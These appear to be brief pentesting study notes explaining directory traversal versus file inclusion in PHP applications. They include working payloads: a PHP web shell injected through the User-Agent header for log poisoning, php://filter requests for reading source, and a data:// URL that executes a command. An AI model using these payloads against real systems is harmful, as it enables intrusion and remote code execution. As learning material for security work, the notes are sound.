
we can use directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root. _File inclusion_ vulnerabilities allow us to "include" a file in the application's running code. This means we can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file.

It can give us opportunity to obtain remote code execution.

for e.g.:
we are able to log user input in access log in user-agent field.

we can add php rce in it and try to load file
<?php echo system($_GET['cmd']); ?>

after this we can try to retrieve reverse shell by running the command by passing the reverse shell command in cmd params.


Note: if you want to read php executable file content we can also use php wrappers like php://filter

example reading admin.php
`/index.php?page=php://filter/resource=admin.php` will print plain text
`/index.php?page=php://filter/convert.base64-encode/resource=admin.txt` will give base64 of page content


we can use data:// to execute
example:
`/page=data://text/plain,<?php%20echo%20system('ls');?>` will execute ls
